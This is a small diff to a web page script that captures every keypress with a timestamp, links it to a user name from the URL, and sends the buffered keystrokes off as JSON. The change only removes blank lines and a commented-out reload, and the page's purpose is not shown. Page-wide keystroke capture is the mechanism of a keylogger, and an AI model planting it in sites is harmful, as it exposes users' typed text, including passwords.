@@ -4,8 +4,6 @@ var buffer = [];
 var urlparts = window.location.href.split('/');
 var user = urlparts[urlparts.length -1];
 
-
-
 document.onkeypress = function(e) {
     var timestamp = Date.now()%10000000;
     var stroke = {
@@ -28,8 +26,6 @@ function sendKeystrokes() {
         value: buffer 
     }));
     buffer = [];
-    // window.location.reload();
-    //
 }
 
 </script>
